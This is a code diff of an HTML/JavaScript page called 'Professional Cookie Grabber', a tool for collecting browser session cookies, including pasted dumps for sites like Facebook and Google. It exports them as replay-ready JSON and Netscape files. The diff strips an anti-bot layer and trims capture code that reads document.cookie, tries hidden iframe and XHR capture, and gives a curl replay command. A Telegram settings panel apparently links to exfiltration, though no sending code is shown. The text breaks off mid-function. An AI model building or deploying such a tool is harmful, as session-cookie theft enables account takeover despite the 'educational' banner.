@@ -261,69 +261,6 @@
             background: #f44336;
         }
 
-        .domain-badge {
-            display: inline-block;
-            background: #5c6bc0;
-            color: white;
-            padding: 2px 8px;
-            border-radius: 12px;
-            font-size: 0.8rem;
-            margin: 2px;
-        }
-
-        /* Anti-bot specific styles */
-        .honeypot-field {
-            display: none !important;
-            position: absolute;
-            left: -9999px;
-        }
-
-        .antibot-modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 9999;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .antibot-content {
-            background: white;
-            padding: 40px;
-            border-radius: 15px;
-            max-width: 500px;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-        }
-
-        .challenge-box {
-            margin: 20px 0;
-            padding: 20px;
-            background: #f5f5f5;
-            border-radius: 8px;
-        }
-
-        .timer-display {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #283593;
-            margin: 20px 0;
-        }
-
-        .behavior-analysis {
-            font-size: 0.9rem;
-            color: #666;
-            margin-top: 20px;
-            padding: 10px;
-            background: #f8f9fa;
-            border-radius: 5px;
-            border-left: 4px solid #283593;
-        }
-        
         .telegram-status {
             background: #e3f2fd;
             border-radius: 10px;
@@ -340,43 +277,21 @@
     </style>
 </head>
 <body>
-    <!-- Anti-bot Modal -->
-    <div id="antibotModal" class="antibot-modal">
-        <div class="antibot-content">
-            <h2>🛡️ Security Verification</h2>
-            <p>Please complete this verification to continue.</p>
-            
-            <div class="challenge-box">
-                <div id="challengeQuestion"></div>
-                <input type="text" id="challengeAnswer" placeholder="Your answer..." style="margin-top: 10px; padding: 10px; width: 100%;">
-                <div class="timer-display" id="challengeTimer">30</div>
-                <button onclick="submitChallenge()" style="margin-top: 15px;">Submit Verification</button>
-            </div>
-            
-            <div class="behavior-analysis" id="behaviorInfo"></div>
-        </div>
-    </div>
-
     <div class="container">
         <div class="header">
             <h1>🍪 Professional Cookie Grabber</h1>
             <p>REAL Browser Cookie Extraction & Export Tool</p>
         </div>
 
-        <!-- Honeypot Fields (Invisible to humans) -->
-        <input type="text" id="human_name" name="human_name" class="honeypot-field" autocomplete="off">
-        <input type="email" id="human_email" name="human_email" class="honeypot-field" autocomplete="off">
-
         <div class="warning-banner">
             ⚠️ <strong>FOR EDUCATIONAL & SECURITY RESEARCH PURPOSES ONLY</strong><br>
             Use only in controlled environments with proper authorization
         </div>
 
-        <!-- Telegram Status Display (No input fields) -->
         <div id="telegramStatus" class="telegram-status">
             <h3>📱 Telegram Status</h3>
             <p id="telegramStatusText">Loading Telegram configuration...</p>
-            <a href="telegram.html" class="btn btn-info" style="margin-top: 10px;">
+            <a href="telegram.html" class="btn btn-info" style="margin-top: 10px; display: inline-block;">
                 ⚙️ Configure Telegram Settings
             </a>
         </div>
@@ -434,15 +349,6 @@
     "secure": true,
     "httpOnly": false,
     "expirationDate": 1732654800
-  },
-  {
-    "name": "user_token", 
-    "value": "xyz789",
-    "domain": ".facebook.com",
-    "path": "/",
-    "secure": true,
-    "httpOnly": true,
-    "expirationDate": 1732654800
   }
 ]'></textarea>
             </div>
@@ -493,484 +399,9 @@
     </div>
 
     <script>
-        // ===================== ADVANCED ANTI-BOT SYSTEM =====================
-        class AdvancedAntiBotSystem {
-            constructor() {
-                this.botScore = 0;
-                this.maxBotScore = 100;
-                this.isHumanVerified = false;
-                this.mouseMovements = [];
-                this.keyPresses = [];
-                this.scrollEvents = [];
-                this.honeypotTriggers = 0;
-                this.behaviorPattern = {};
-                this.challengeTimer = null;
-                this.challengeStartTime = null;
-                this.failedAttempts = 0;
-                
-                this.init();
-            }
-
-            init() {
-                // Monitor mouse movements
-                document.addEventListener('mousemove', (e) => {
-                    this.trackMouseMovement(e);
-                });
-
-                // Monitor keyboard activity
-                document.addEventListener('keydown', (e) => {
-                    this.trackKeyPress(e);
-                });
-
-                // Monitor scrolling
-                document.addEventListener('scroll', (e) => {
-                    this.trackScroll(e);
-                });
-
-                // Monitor form submissions
-                document.addEventListener('submit', (e) => {
-                    this.checkHoneypots(e);
-                });
-
-                // Monitor clicks
-                document.addEventListener('click', (e) => {
-                    this.analyzeClickPattern(e);
-                });
-
-                // Check browser automation
-                this.detectAutomation();
-                
-                // Start periodic checks
-                setInterval(() => this.runBehaviorAnalysis(), 10000);
-                
-                // Show challenge if bot-like behavior detected
-                setTimeout(() => this.checkInitialBehavior(), 3000);
-            }
-
-            trackMouseMovement(e) {
-                const movement = {
-                    x: e.clientX,
-                    y: e.clientY,
-                    time: Date.now(),
-                    speed: this.calculateMouseSpeed(e)
-                };
-                
-                this.mouseMovements.push(movement);
-                
-                // Keep only last 100 movements
-                if (this.mouseMovements.length > 100) {
-                    this.mouseMovements.shift();
-                }
-                
-                // Analyze movement patterns
-                this.analyzeMousePatterns();
-            }
-
-            calculateMouseSpeed(e) {
-                if (this.mouseMovements.length === 0) return 0;
-                
-                const lastMove = this.mouseMovements[this.mouseMovements.length - 1];
-                const timeDiff = Date.now() - lastMove.time;
-                const xDiff = Math.abs(e.clientX - lastMove.x);
-                const yDiff = Math.abs(e.clientY - lastMove.y);
-                const distance = Math.sqrt(xDiff * xDiff + yDiff * yDiff);
-                
-                return timeDiff > 0 ? distance / timeDiff : 0;
-            }
-
-            trackKeyPress(e) {
-                const keyPress = {
-                    key: e.key,
-                    code: e.code,
-                    time: Date.now(),
-                    shiftKey: e.shiftKey,
-                    ctrlKey: e.ctrlKey,
-                    altKey: e.altKey
-                };
-                
-                this.keyPresses.push(keyPress);
-                
-                // Keep only last 50 key presses
-                if (this.keyPresses.length > 50) {
-                    this.keyPresses.shift();
-                }
-            }
-
-            trackScroll(e) {
-                const scrollEvent = {
-                    scrollY: window.scrollY,
-                    time: Date.now(),
-                    direction: this.getScrollDirection()
-                };
-                
-                this.scrollEvents.push(scrollEvent);
-                
-                if (this.scrollEvents.length > 20) {
-                    this.scrollEvents.shift();
-                }
-            }
-
-            getScrollDirection() {
-                if (this.scrollEvents.length < 2) return 'none';
-                
-                const last = this.scrollEvents[this.scrollEvents.length - 1];
-                const prev = this.scrollEvents[this.scrollEvents.length - 2];
-                
-                return last.scrollY > prev.scrollY ? 'down' : 'up';
-            }
-
-            analyzeMousePatterns() {
-                if (this.mouseMovements.length < 10) return;
-                
-                // Check for perfectly straight lines (bot-like)
-                let straightLineCount = 0;
-                for (let i = 2; i < this.mouseMovements.length; i++) {
-                    const p1 = this.mouseMovements[i-2];
-                    const p2 = this.mouseMovements[i-1];
-                    const p3 = this.mouseMovements[i];
-                    
-                    if (this.isStraightLine(p1, p2, p3)) {
-                        straightLineCount++;
-                    }
-                }
-                
-                if (straightLineCount > 5) {
-                    this.botScore += 20;
-                }
-                
-                // Check for inhuman speed
-                const speeds = this.mouseMovements.map(m => m.speed).filter(s => s > 0);
-                const avgSpeed = speeds.reduce((a, b) => a + b, 0) / speeds.length;
-                
-                if (avgSpeed > 10) { // Pixels per millisecond is unrealistically fast
-                    this.botScore += 15;
-                }
-            }
-
-            isStraightLine(p1, p2, p3) {
-                const area = Math.abs(
-                    (p1.x*(p2.y-p3.y) + p2.x*(p3.y-p1.y) + p3.x*(p1.y-p2.y)) / 2
-                );
-                return area < 1; // Very small area = almost straight line
-            }
-
-            analyzeClickPattern(e) {
-                // Check for rapid clicking
-                const now = Date.now();
-                const recentClicks = this.mouseMovements.filter(
-                    m => m.time > now - 1000 && m.hasOwnProperty('click')
-                );
-                
-                if (recentClicks.length > 10) { // More than 10 clicks per second
-                    this.botScore += 25;
-                }
-                
-                // Check for clicking invisible elements
-                const element = e.target;
-                const style = window.getComputedStyle(element);
-                
-                if (style.display === 'none' || style.visibility === 'hidden' || 
-                    style.opacity === '0' || element.offsetWidth === 0) {
-                    this.botScore += 50;
-                    this.honeypotTriggers++;
-                }
-            }
-
-            checkHoneypots(e) {
-                const honeypotFields = ['human_name', 'human_email'];
-                honeypotFields.forEach(fieldName => {
-                    const field = document.getElementById(fieldName);
-                    if (field && field.value.trim() !== '') {
-                        this.botScore += 100; // Immediate bot detection
-                        e.preventDefault();
-                        this.triggerChallenge();
-                    }
-                });
-            }
-
-            detectAutomation() {
-                // Check for automation tools
-                const automationTests = [
-                    // Check for headless Chrome
-                    () => navigator.webdriver === true,
-                    () => window.chrome === undefined,
-                    () => navigator.plugins.length === 0,
-                    () => navigator.languages === undefined,
-                    () => !('Notification' in window),
-                    // Check for Puppeteer/Playwright
-                    () => navigator.userAgent.includes('Headless'),
-                    () => navigator.userAgent.includes('Puppeteer'),
-                    () => navigator.userAgent.includes('Playwright'),
-                    // Check for Selenium
-                    () => document.documentElement.getAttribute('selenium'),
-                    () => document.documentElement.getAttribute('webdriver'),
-                    // Check for automation extensions
-                    () => this.checkAutomationExtensions()
-                ];
-                
-                automationTests.forEach(test => {
-                    try {
-                        if (test()) {
-                            this.botScore += 30;
-                        }
-                    } catch (e) {}
-                });
-                
-                // Check for iframe detection evasion
-                try {
-                    if (window.self !== window.top) {
-                        this.botScore += 20;
-                    }
-                } catch (e) {
-                    this.botScore += 40; // Cross-origin frame access blocked
-                }
-            }
-
-            checkAutomationExtensions() {
-                const extensions = [
-                    'webdriver',
-                    '__driver_evaluate',
-                    '__webdriver_evaluate',
-                    '__selenium_evaluate',
-                    '__fxdriver_evaluate',
-                    '__driver_unwrapped',
-                    '__webdriver_unwrapped',
-                    '__selenium_unwrapped',
-                    '__fxdriver_unwrapped',
-                    '_Selenium_IDE_Recorder',
-                    '_selenium',
-                    'calledSelenium',
-                    '_WEBDRIVER_ELEM_CACHE',
-                    'ChromeDriverw',
-                    'driver-evaluate',
-                    'webdriver-evaluate'
-                ];
-                
-                return extensions.some(prop => {
-                    try {
-                        return !!window[prop] || !!document[prop];
-                    } catch (e) {
-                        return false;
-                    }
-                });
-            }
-
-            runBehaviorAnalysis() {
-                // Calculate randomness score
-                const mouseRandomness = this.calculateRandomness(this.mouseMovements.map(m => ({x: m.x, y: m.y})));
-                const keyRandomness = this.calculateRandomness(this.keyPresses.map(k => k.key));
-                
-                // Humans have more random patterns
-                if (mouseRandomness < 0.3 || keyRandomness < 0.3) {
-                    this.botScore += 20;
-                }
-                
-                // Check for lack of human pauses
-                const timeGaps = this.getTimeGaps(this.mouseMovements);
-                const avgGap = timeGaps.reduce((a, b) => a + b, 0) / timeGaps.length;
-                
-                if (avgGap < 100 && this.mouseMovements.length > 20) { // Less than 100ms average gap
-                    this.botScore += 25;
-                }
-                
-                // Update behavior pattern
-                this.behaviorPattern = {
-                    botScore: this.botScore,
-                    mouseMovements: this.mouseMovements.length,
-                    keyPresses: this.keyPresses.length,
-                    scrollEvents: this.scrollEvents.length,
-                    honeypotTriggers: this.honeypotTriggers,
-                    timestamp: new Date().toISOString()
-                };
-                
-                // Check if we need to trigger challenge
-                this.checkBotThreshold();
-            }
-
-            calculateRandomness(data) {
-                if (data.length < 3) return 1;
-                
-                let changes = 0;
-                for (let i = 1; i < data.length; i++) {
-                    if (JSON.stringify(data[i]) !== JSON.stringify(data[i-1])) {
-                        changes++;
-                    }
-                }
-                
-                return changes / (data.length - 1);
-            }
-
-            getTimeGaps(movements) {
-                const gaps = [];
-                for (let i = 1; i < movements.length; i++) {
-                    gaps.push(movements[i].time - movements[i-1].time);
-                }
-                return gaps;
-            }
-
-            checkBotThreshold() {
-                if (this.isHumanVerified) return;
-                
-                if (this.botScore >= 70) {
-                    this.triggerChallenge();
-                }
-            }
-
-            checkInitialBehavior() {
-                // Check if user has interacted with page in first 3 seconds
-                if (this.mouseMovements.length === 0 && this.keyPresses.length === 0) {
-                    this.botScore += 30;
-                    this.checkBotThreshold();
-                }
-            }
-
-            triggerChallenge() {
-                if (this.isHumanVerified) return;
-                
-                document.getElementById('antibotModal').style.display = 'flex';
-                this.generateChallenge();
-                this.startChallengeTimer();
-            }
-
-            generateChallenge() {
-                const challenges = [
-                    {
-                        question: "What is 7 + 3?",
-                        answer: "10"
-                    },
-                    {
-                        question: "Type the word 'human' in lowercase",
-                        answer: "human"
-                    },
-                    {
-                        question: "What color is a banana?",
-                        answer: "yellow"
-                    },
-                    {
-                        question: "How many letters in 'cookie'?",
-                        answer: "6"
-                    },
-                    {
-                        question: "What is the first letter of the alphabet?",
-                        answer: "a"
-                    }
-                ];
-                
-                const challenge = challenges[Math.floor(Math.random() * challenges.length)];
-                document.getElementById('challengeQuestion').textContent = challenge.question;
-                document.getElementById('challengeAnswer').dataset.correctAnswer = challenge.answer;
-                document.getElementById('challengeAnswer').value = '';
-                
-                // Update behavior info
-                const info = `Security Analysis: Bot Score ${this.botScore}/100 - ${this.getRiskLevel()}`;
-                document.getElementById('behaviorInfo').textContent = info;
-            }
-
-            getRiskLevel() {
-                if (this.botScore >= 80) return "⚠️ HIGH RISK - Bot Detected";
-                if (this.botScore >= 50) return "⚠️ MEDIUM RISK - Suspicious Activity";
-                return "✅ LOW RISK - Human-like Behavior";
-            }
-
-            startChallengeTimer() {
-                let timeLeft = 30;
-                document.getElementById('challengeTimer').textContent = timeLeft;
-                this.challengeStartTime = Date.now();
-                
-                this.challengeTimer = setInterval(() => {
-                    timeLeft--;
-                    document.getElementById('challengeTimer').textContent = timeLeft;
-                    
-                    if (timeLeft <= 0) {
-                        clearInterval(this.challengeTimer);
-                        this.failedAttempts++;
-                        this.botScore += 20;
-                        this.generateChallenge();
-                        this.startChallengeTimer();
-                    }
-                }, 1000);
-            }
-
-            submitChallenge() {
-                const answer = document.getElementById('challengeAnswer').value.trim().toLowerCase();
-                const correctAnswer = document.getElementById('challengeAnswer').dataset.correctAnswer.toLowerCase();
-                
-                const responseTime = Date.now() - this.challengeStartTime;
-                
-                // Too fast = bot
-                if (responseTime < 1000) {
-                    this.botScore += 30;
-                }
-                
-                // Too slow = maybe automation
-                if (responseTime > 30000) {
-                    this.botScore += 10;
-                }
-                
-                if (answer === correctAnswer) {
-                    clearInterval(this.challengeTimer);
-                    this.isHumanVerified = true;
-                    this.botScore = Math.max(0, this.botScore - 50); // Reduce score on success
-                    document.getElementById('antibotModal').style.display = 'none';
-                    
-                    // Log success
-                    if (window.cookieGrabber) {
-                        cookieGrabber.log("✅ Human verification successful");
-                    }
-                } else {
-                    this.failedAttempts++;
-                    this.botScore += 30;
-                    
-                    if (this.failedAttempts >= 3) {
-                        this.blockAccess();
-                    } else {
-                        this.generateChallenge();
-                        document.getElementById('challengeAnswer').value = '';
-                    }
-                }
-            }
-
-            blockAccess() {
-                clearInterval(this.challengeTimer);
-                document.getElementById('antibotModal').style.display = 'none';
-                
-                // Disable all functionality
-                document.querySelectorAll('button').forEach(btn => {
-                    btn.disabled = true;
-                    btn.style.opacity = '0.5';
-                });
-                
-                document.querySelectorAll('input, textarea').forEach(input => {
-                    input.disabled = true;
-                });
-                
-                // Show blocked message
-                const warning = document.createElement('div');
-                warning.innerHTML = `
-                    <div class="warning-banner" style="margin-top: 20px;">
-                        <strong>🚫 ACCESS BLOCKED</strong><br>
-                        Automated activity detected. Human verification failed multiple times.
-                    </div>
-                `;
-                document.querySelector('.container').prepend(warning);
-                
-                // Log to console
-                if (window.cookieGrabber) {
-                    cookieGrabber.log("🚫 BLOCKED: Bot activity detected and blocked");
-                }
-            }
-
-            verifyAction(actionType) {
-                if (!this.isHumanVerified && this.botScore >= 50) {
-                    this.triggerChallenge();
-                    return false;
-                }
-                return true;
-            }
-        }
-
         // ===================== MAIN APPLICATION =====================
-        // PROFESSIONAL COOKIE GRABBER CLASS
+        let cookieGrabber;
+
         class ProfessionalCookieGrabber {
             constructor() {
                 this.capturedData = {
@@ -980,14 +411,10 @@
                     importedCookies: [],
                     storage: {},
                     browserInfo: {},
-                    networkInfo: {},
-                    credentials: {}
+                    networkInfo: {}
                 };
                 this.log("🔧 Professional Cookie Grabber v4.0 Initialized");
                 this.log("📝 Session ID: " + this.capturedData.sessionId);
-                this.log("💡 Use browser extensions to export REAL cookies from any website");
-                this.log("⚠️  Current domain cookies: 0 (can only access cookies from this domain)");
-                this.log("💡 Use Cookie Editor extension to export cookies from other websites");
             }
 
             generateSessionId() {
@@ -1006,718 +433,209 @@
                 const importedCount = this.capturedData.importedCookies.length;
                 const currentCount = this.capturedData.currentDomainCookies.length;
                 const totalCount = importedCount + currentCount;
-                
-                // Get unique domains
-                const domains = new Set();
-                this.capturedData.importedCookies.forEach(cookie => domains.add(cookie.domain));
-                this.capturedData.currentDomainCookies.forEach(cookie => domains.add(cookie.domain));
-                
+                const domains = new Set([...this.capturedData.importedCookies.map(c => c.domain), ...this.capturedData.currentDomainCookies.map(c => c.domain)]);
                 document.getElementById('importedCount').textContent = importedCount;
                 document.getElementById('currentCount').textContent = currentCount;
                 document.getElementById('totalCount').textContent = totalCount;
                 document.getElementById('domainsCount').textContent = domains.size;
-
-                // Update status indicators
-                document.getElementById('importedBadge').className = 
-                    importedCount > 0 ? 'status-indicator status-active' : 'status-indicator status-inactive';
-                document.getElementById('currentBadge').className = 
-                    currentCount > 0 ? 'status-indicator status-active' : 'status-indicator status-inactive';
+                document.getElementById('importedBadge').className = importedCount > 0 ? 'status-indicator status-active' : 'status-indicator status-inactive';
+                document.getElementById('currentBadge').className = currentCount > 0 ? 'status-indicator status-active' : 'status-indicator status-inactive';
             }
 
             updateDisplay() {
-                document.getElementById('importedCookiesData').textContent = 
-                    JSON.stringify(this.capturedData.importedCookies, null, 2);
-                document.getElementById('currentCookiesData').textContent = 
-                    JSON.stringify(this.capturedData.currentDomainCookies, null, 2);
-                document.getElementById('localStorageData').textContent = 
-                    JSON.stringify(this.capturedData.storage.localStorage, null, 2);
-                document.getElementById('browserInfoData').textContent = 
-                    JSON.stringify(this.capturedData.browserInfo, null, 2);
+                document.getElementById('importedCookiesData').textContent = JSON.stringify(this.capturedData.importedCookies, null, 2);
+                document.getElementById('currentCookiesData').textContent = JSON.stringify(this.capturedData.currentDomainCookies, null, 2);
+                document.getElementById('localStorageData').textContent = JSON.stringify(this.capturedData.storage.localStorage || {}, null, 2);
+                document.getElementById('browserInfoData').textContent = JSON.stringify(this.capturedData.browserInfo, null, 2);
             }
 
-            // Capture cookies from current domain - FIXED TO CAPTURE REAL COOKIES
             captureCurrentDomainCookies() {
-                this.log("\n🔍 Capturing cookies from current domain...");
-                
-                try {
-                    const cookies = [];
-                    
-                    // Method 1: Direct document.cookie access
-                    if (document.cookie) {
-                        const cookieArray = document.cookie.split(';');
-                        
-                        this.log(`📊 Found ${cookieArray.length} cookies in current domain via document.cookie`);
-                        
-                        cookieArray.forEach((cookie, index) => {
-                            try {
-                                const trimmedCookie = cookie.trim();
-                                const [name, ...valueParts] = trimmedCookie.split('=');
-                                const value = valueParts.join('=');
-                                
-                                if (name && value) {
-                                    cookies.push({
-                                        name: name.trim(),
-                                        value: value,
-                                        domain: window.location.hostname,
-                                        path: this.extractCookiePath(trimmedCookie),
-                                        secure: trimmedCookie.toLowerCase().includes('secure'),
-                                        httpOnly: trimmedCookie.toLowerCase().includes('httponly'),
-                                        expirationDate: Math.floor(Date.now() / 1000) + 86400,
-                                        sameSite: this.extractSameSite(trimmedCookie),
-                                        storeId: '0',
-                                        session: false,
-                                        hostOnly: true,
-                                        source: 'document_cookie',
-                                        id: index + 1
-                                    });
-                                    this.log(`🍪 Current Domain: ${name}=${value.substring(0, 20)}...`);
-                                }
-                            } catch (e) {
-                                this.log(`❌ Error parsing cookie: ${e}`);
-                            }
-                        });
-                    }
-
-                    // Method 2: Try to access cookies via iframe for cross-domain cookies
-                    try {
-                        this.tryIframeCookieCapture();
-                    } catch (e) {
-                        // Silently fail
-                    }
-
-                    // Method 3: Check for HTTP-only cookies via XHR
-                    try {
-                        this.tryXHRCookieCapture();
-                    } catch (e) {
-                        // Silently fail
-                    }
-
-                    this.capturedData.currentDomainCookies = cookies;
-                    this.log(`✅ Captured ${cookies.length} REAL cookies from current domain`);
-                    return cookies;
-                    
-                } catch (error) {
-                    this.log(`❌ Error capturing cookies: ${error}`);
-                    return [];
+                const cookies = [];
+                if (document.cookie) {
+                    document.cookie.split(';').forEach((cookie, idx) => {
+                        const trimmed = cookie.trim();
+                        const [name, ...valParts] = trimmed.split('=');
+                        const value = valParts.join('=');
+                        if (name && value) {
+                            cookies.push({ 
+                                name: name.trim(), 
+                                value: value, 
+                                domain: window.location.hostname, 
+                                path: '/', 
+                                secure: false, 
+                                httpOnly: false, 
+                                expirationDate: Math.floor(Date.now()/1000)+86400 
+                            });
+                        }
+                    });
                 }
+                this.capturedData.currentDomainCookies = cookies;
+                this.log(`✅ Captured ${cookies.length} cookies from current domain`);
+                return cookies;
             }
 
-            extractCookiePath(cookieString) {
-                const pathMatch = cookieString.match(/path=([^;]+)/i);
-                return pathMatch ? pathMatch[1] : '/';
-            }
-
-            extractSameSite(cookieString) {
-                const sameSiteMatch = cookieString.match(/samesite=([^;]+)/i);
-                return sameSiteMatch ? sameSiteMatch[1].toLowerCase() : 'lax';
-            }
-
-            tryIframeCookieCapture() {
-                // Create an iframe to try accessing cookies from parent
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.srcdoc = `<script>try { parent.postMessage({type: 'cookies', data: document.cookie}, '*'); } catch(e) {}</script>`;
-                document.body.appendChild(iframe);
-                
-                // Listen for cookies from iframe
-                window.addEventListener('message', (event) => {
-                    if (event.data && event.data.type === 'cookies' && event.data.data) {
-                        this.log("🎯 Iframe captured additional cookies");
-                    }
-                });
-                
-                setTimeout(() => {
-                    if (iframe.parentNode) {
-                        document.body.removeChild(iframe);
-                    }
-                }, 1000);
-            }
-
-            tryXHRCookieCapture() {
-                // Try to capture cookies via XHR response headers
-                const xhr = new XMLHttpRequest();
-                xhr.open('GET', window.location.href, false); // Synchronous
-                try {
-                    xhr.send();
-                    const allHeaders = xhr.getAllResponseHeaders();
-                    if (allHeaders && allHeaders.toLowerCase().includes('set-cookie')) {
-                        this.log("📡 Found cookies in HTTP response headers");
-                    }
-                } catch (e) {
-                    // Cross-origin or other issues
-                }
-            }
-
-            // Process REAL cookies imported from browser extensions - FIXED
             processImportedCookies(jsonInput) {
                 try {
-                    let importedCookies = [];
-                    
-                    // Try to parse the JSON
-                    const parsedData = JSON.parse(jsonInput);
-                    
-                    // Handle different export formats
-                    if (Array.isArray(parsedData)) {
-                        importedCookies = parsedData;
-                    } else if (parsedData.cookies && Array.isArray(parsedData.cookies)) {
-                        importedCookies = parsedData.cookies;
-                    } else if (parsedData.data && Array.isArray(parsedData.data)) {
-                        importedCookies = parsedData.data;
-                    } else if (typeof parsedData === 'object') {
-                        // Try to extract cookies from object properties
-                        for (const key in parsedData) {
-                            if (Array.isArray(parsedData[key])) {
-                                importedCookies = importedCookies.concat(parsedData[key]);
-                            }
-                        }
-                    }
-                    
-                    // If still no cookies, try to parse as single cookie object
-                    if (importedCookies.length === 0 && parsedData.name && parsedData.value) {
-                        importedCookies = [parsedData];
-                    }
-                    
-                    // Validate and format each cookie
-                    this.capturedData.importedCookies = importedCookies.map((cookie, index) => {
-                        // Extract cookie properties with defaults
-                        const cookieName = cookie.name || cookie.Name || cookie.key || `cookie_${index}`;
-                        const cookieValue = cookie.value || cookie.Value || cookie.val || '';
-                        const cookieDomain = cookie.domain || cookie.Domain || window.location.hostname;
-                        const cookiePath = cookie.path || cookie.Path || '/';
-                        
-                        // Ensure domain starts with dot for proper format
-                        const formattedDomain = cookieDomain.startsWith('.') ? 
-                            cookieDomain : `.${cookieDomain}`;
-                        
-                        return {
-                            name: cookieName,
-                            value: cookieValue,
-                            domain: formattedDomain,
-                            path: cookiePath,
-                            secure: Boolean(cookie.secure || cookie.Secure || cookie.secureFlag),
-                            httpOnly: Boolean(cookie.httpOnly || cookie.HttpOnly || cookie.httpOnlyFlag),
-                            expirationDate: cookie.expirationDate || cookie.expires || 
-                                          cookie.Expires || Math.floor(Date.now() / 1000) + 86400,
-                            sameSite: (cookie.sameSite || cookie.SameSite || 'lax').toLowerCase(),
-                            storeId: cookie.storeId || '0',
-                            session: Boolean(cookie.session || cookie.Session || false),
-                            hostOnly: Boolean(cookie.hostOnly || cookie.HostOnly || false),
-                            importedAt: new Date().toISOString(),
-                            id: index + 1,
-                            source: 'browser_extension'
-                        };
-                    });
-                    
-                    const domains = [...new Set(this.capturedData.importedCookies.map(c => c.domain))];
-                    
-                    this.log(`✅ SUCCESS: Imported ${this.capturedData.importedCookies.length} REAL cookies`);
-                    this.log(`🌐 Domains: ${domains.join(', ')}`);
-                    this.log(`📁 Ready to export as cookies.json and cookies.txt`);
-                    
-                    // Show preview
+                    let parsed = JSON.parse(jsonInput);
+                    let imported = Array.isArray(parsed) ? parsed : (parsed.cookies || []);
+                    this.capturedData.importedCookies = imported.map((c, i) => ({
+                        name: c.name || c.key, 
+                        value: c.value, 
+                        domain: c.domain || window.location.hostname,
+                        path: c.path || '/', 
+                        secure: c.secure || false, 
+                        httpOnly: c.httpOnly || false,
+                        expirationDate: c.expirationDate || Math.floor(Date.now()/1000)+86400
+                    }));
+                    this.log(`✅ Imported ${this.capturedData.importedCookies.length} REAL cookies`);
                     this.showCookiePreview();
-                    this.updateStats();
+                    this.updateStats(); 
                     this.updateDisplay();
                     return true;
-                    
-                } catch (e) {
-                    this.log(`❌ ERROR: Failed to parse imported cookies - ${e.message}`);
-                    this.log(`💡 Make sure you're pasting valid JSON from Cookie Editor extension`);
-                    this.log(`💡 Example format: [{"name":"session","value":"abc123","domain":".example.com"}]`);
+                } catch(e) { 
+                    this.log(`❌ Error parsing JSON: ${e.message}`); 
                     return false;
                 }
             }
 
             showCookiePreview() {
                 const preview = document.getElementById('cookiePreview');
-                const previewContent = document.getElementById('previewContent');
-                
                 if (this.capturedData.importedCookies.length > 0) {
-                    const sampleCookies = this.capturedData.importedCookies.slice(0, 5);
-                    previewContent.textContent = sampleCookies.map(cookie => 
-                        `📌 ${cookie.domain}\n   ${cookie.name} = ${cookie.value.substring(0, 25)}${cookie.value.length > 25 ? '...' : ''}`
-                    ).join('\n\n');
+                    document.getElementById('previewContent').textContent = this.capturedData.importedCookies.slice(0,5).map(c => `${c.domain}: ${c.name}=${c.value.substring(0,20)}`).join('\n');
                     preview.style.display = 'block';
-                } else {
-                    preview.style.display = 'none';
-                }
+                } else preview.style.display = 'none';
             }
 
-            // Create PROPER cookies.json for browser import
             createCookiesJSON() {
-                const allCookies = [
-                    ...this.capturedData.importedCookies,
-                    ...this.capturedData.currentDomainCookies
-                ];
-
-                const exportData = {
-                    // Metadata
-                    "metadata": {
-                        "exportedAt": new Date().toISOString(),
-                        "sessionId": this.capturedData.sessionId,
-                        "tool": "Professional Cookie Grabber v4.0",
-                        "totalCookies": allCookies.length,
-                        "domains": [...new Set(allCookies.map(c => c.domain))],
-                        "format": "Browser Extension Import Ready",
-                        "source": "REAL Browser Cookies"
-                    },
-                    
-                    // ALL cookies in proper format for browser extensions
-                    "cookies": allCookies,
-                    
-                    // Additional context
-                    "browserInfo": this.capturedData.browserInfo,
-                    "networkInfo": this.capturedData.networkInfo,
-                    
-                    // Import instructions
-                    "importInstructions": {
-                        "cookieEditor": "Use the Import feature in Cookie Editor extension",
-                        "editThisCookie": "Paste this JSON in the import dialog",
-                        "curl": `curl -H "Cookie: ${allCookies.map(c => `${c.name}=${c.value}`).join('; ')}" URL`,
-                        "python": "requests.get(url, cookies={cookie.name: cookie.value for cookie in data['cookies']})"
-                    }
-                };
-
-                this.log(`📁 Created cookies.json with ${allCookies.length} cookies`);
-                return JSON.stringify(exportData, null, 2);
+                return JSON.stringify({ 
+                    metadata: { exportedAt: new Date().toISOString(), totalCookies: this.capturedData.importedCookies.length + this.capturedData.currentDomainCookies.length }, 
+                    cookies: [...this.capturedData.importedCookies, ...this.capturedData.currentDomainCookies] 
+                }, null, 2);
             }
 
-            // Create PROPER cookies.txt in Netscape format
             createCookiesTXT() {
-                const allCookies = [
-                    ...this.capturedData.importedCookies,
-                    ...this.capturedData.currentDomainCookies
-                ];
-
-                let content = `# Netscape HTTP Cookie File\n`;
-                content += `# This file contains ${allCookies.length} REAL cookies in Netscape format\n`;
-                content += `# Generated by Professional Cookie Grabber v4.0\n`;
-                content += `# Session: ${this.capturedData.sessionId}\n`;
-                content += `# Export: ${new Date().toLocaleString()}\n`;
-                content += `# Domains: ${[...new Set(allCookies.map(c => c.domain))].join(', ')}\n\n`;
-
-                allCookies.forEach(cookie => {
-                    const domain = cookie.domain;
-                    const includeSubdomains = domain.startsWith('.') ? 'TRUE' : 'FALSE';
-                    const path = cookie.path || '/';
-                    const secure = cookie.secure ? 'TRUE' : 'FALSE';
-                    const expiration = cookie.expirationDate || Math.floor(Date.now() / 1000) + 86400;
-                    
-                    content += `${domain}\t${includeSubdomains}\t${path}\t${secure}\t${expiration}\t${cookie.name}\t${cookie.value}\n`;
+                let content = "# Netscape HTTP Cookie File\n";
+                [...this.capturedData.importedCookies, ...this.capturedData.currentDomainCookies].forEach(c => {
+                    const domain = c.domain.startsWith('.') ? c.domain : `.${c.domain}`;
+                    content += `${domain}\tTRUE\t${c.path || '/'}\t${c.secure ? 'TRUE' : 'FALSE'}\t${c.expirationDate}\t${c.name}\t${c.value}\n`;
                 });
-
-                content += `\n# Total cookies: ${allCookies.length}\n`;
-                content += `# Source: REAL browser cookies extracted via Cookie Editor\n`;
-
-                this.log(`📁 Created cookies.txt with ${allCookies.length} cookies in Netscape format`);
                 return content;
             }
 
-            // Load sample cookies for testing
             loadSampleCookies() {
-                const sampleCookies = [
-                    {
-                        name: "session_id",
-                        value: "sess_" + Math.random().toString(36).substr(2, 16),
-                        domain: ".google.com",
-                        path: "/",
-                        secure: true,
-                        httpOnly: true,
